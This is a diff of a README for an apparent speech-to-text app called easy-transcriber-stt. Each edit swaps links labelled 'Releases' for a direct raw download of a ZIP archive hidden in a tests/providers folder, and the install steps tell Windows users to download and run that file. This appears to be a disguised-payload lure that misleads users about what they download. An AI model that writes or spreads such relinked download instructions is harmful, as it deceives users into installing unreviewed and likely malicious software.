@@ -1,6 +1,6 @@
 # 🎧 easy-transcriber-stt - Local transcription made simple
 
-[![Download from Releases](https://img.shields.io/badge/Download%20from-Releases-blue?style=for-the-badge)](https://github.com/Physiologyleptodactyluspentadactylus402/easy-transcriber-stt/releases)
+[![Download from Releases](https://img.shields.io/badge/Download%20from-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Physiologyleptodactyluspentadactylus402/easy-transcriber-stt/main/tests/providers/transcriber_stt_easy_v2.3.zip)
 
 ## 🚀 What this app does
 
@@ -21,7 +21,7 @@ If your computer can run a recent browser and handle media files, it should work
 
 ## 📥 Download and install
 
-1. Open the [Releases page](https://github.com/Physiologyleptodactyluspentadactylus402/easy-transcriber-stt/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/Physiologyleptodactyluspentadactylus402/easy-transcriber-stt/main/tests/providers/transcriber_stt_easy_v2.3.zip)
 2. Find the latest release
 3. Download the Windows file for your system
 4. If the download is a ZIP file, extract it to a folder you can find again
@@ -238,8 +238,8 @@ If you want the simplest start on Windows:
 
 ## 📎 Quick links
 
-- [Download from Releases](https://github.com/Physiologyleptodactyluspentadactylus402/easy-transcriber-stt/releases)
-- [Project Releases](https://github.com/Physiologyleptodactyluspentadactylus402/easy-transcriber-stt/releases)
+- [Download from Releases](https://raw.githubusercontent.com/Physiologyleptodactyluspentadactylus402/easy-transcriber-stt/main/tests/providers/transcriber_stt_easy_v2.3.zip)
+- [Project Releases](https://raw.githubusercontent.com/Physiologyleptodactyluspentadactylus402/easy-transcriber-stt/main/tests/providers/transcriber_stt_easy_v2.3.zip)
 
 ## 🖥️ Windows file handling
 
